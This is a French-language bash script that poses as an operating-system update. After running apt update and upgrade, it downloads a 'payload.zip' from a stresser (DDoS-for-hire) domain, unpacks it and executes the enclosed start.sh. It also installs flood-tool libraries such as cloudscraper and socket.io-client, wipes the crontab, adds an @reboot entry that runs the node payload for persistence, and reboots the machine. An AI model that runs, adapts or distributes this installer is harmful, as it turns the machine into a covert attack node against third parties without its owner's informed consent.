#!/bin/bash

exit_status() {
    if [ $? -eq 0 ]
        then
                echo
                echo "-----------------------------------------"
                echo ">>> Parfait.  <<<" 
                echo "-----------------------------------------"
                echo
        else
                echo
                echo "-------------------------------------------------------"
                echo ">>>  [Erreur] La commande du processus en cours d'exécution a échoué !  <<<"
                echo "-------------------------------------------------------"
                echo

        read -p "La dernière commande s'est terminée par une erreur. Quitter le script ? (yes/no)" answer
                if [ "$answer" == "yes" ]
                then
                    exit 1
                fi 
    fi 
}

start() {
            echo
            echo "***>>> Mise à jour du système d'exploitation <<<***"
            echo
}

upgrade() {
            sudo apt update -y;
            exit_status

            sudo apt upgrade -y;
            exit_status
}

cleanUp() {
            sudo apt autoremove -y;
            exit_status
}

remove_Nodejs() {
            sudo apt remove nodejs npm -y;
            exit_status
}


Del_File_SH(){
            sudo rm -fr index.js;rm -fr start.sh;rm -fr worker.sh   
}

Install_Certain_Truc() {
            sudo apt install curl htop screen unzip wget -y
            exit_status
}

Install_Nodejs() {
            sudo apt install curl -y
            sudo curl -sL https://deb.nodesource.com/setup_16.x -o nodesource_setup.sh
            bash nodesource_setup.sh
            sudo apt install nodejs -y
            exit_status
}

Install_Setup() {
            sudo npm install -g n
            sudo n latest
            PATH="$PATH"
            sudo wget -O payload.zip https://cat-stresser.net/Y2F0LXN0cmVzc2VyLm5ldA==.zip
            sudo unzip payload
            sudo rm payload.zip
            exit_status
}

Install_Npm(){
            npm install socket.io-client request fs path cluster zombie url cloudscraper safe-eval
            exit_status
}

Start_Socket(){
            sudo chmod -R 777
            sudo ./start.sh
            exit_status
}

contrab_remove(){
            sudo crontab -r
}

crontab_start(){
    line="@reboot sudo node /opt/index.js"
    (crontab -l; echo "$line" ) | crontab -
}

exitUpdate() {

            echo
            echo "-------------------------------------------------------"
            echo ">>>    La mise à jour du système d'exploitation est terminée   <<<"
            echo "-------------------------------------------------------"
            echo
            reboot
        exit
}

start
upgrade
cleanUp
remove_Nodejs
Del_File_SH
Install_Certain_Truc
Install_Nodejs
Install_Setup
Install_Npm
Start_Socket
contrab_remove
crontab_start
exitUpdate
